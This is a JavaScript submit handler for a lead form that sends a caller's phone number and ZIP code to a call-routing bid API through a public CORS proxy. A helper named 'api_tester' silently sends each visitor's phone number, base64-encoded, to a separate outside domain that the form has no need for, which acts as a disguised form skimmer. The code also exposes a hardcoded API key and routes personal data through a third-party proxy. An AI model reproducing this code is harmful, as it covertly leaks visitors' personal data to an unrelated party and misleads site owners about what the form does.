document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phone_home = '+1' + document.getElementById('caller_id').value;
    const formData = new FormData();
    formData.append('caller_number', phone_home);
    document.getElementById('alertContainer').innerHTML = '';

    api_tester(document.getElementById('caller_id').value);
 
    formData.append('zip', document.getElementById('zip').value);


    const url = 'https://corsproxy.io/?https://api.routingapi.com/rtbs.json?key=ab514634-6955-4f94-9e22-5de033366d2f&publisher_id=a87cd282&' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => response.text())
    .then(responseBody => {
        let responseData;
        try {
            responseData = JSON.parse(responseBody);
        } catch (error) {
            throw new Error('Invalid JSON response');
        }

        if (responseData.rejectReason) {
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    Failure: ${JSON.stringify(responseData)}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        } else {
            delete responseData.bidAmount;
            const successAlert = `
                <div class="alert alert-success" role="alert">
                    Success: ${JSON.stringify(responseData)}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
        }
    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        console.error('Error:', error);
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('API Tester Error:', error);
    }
}
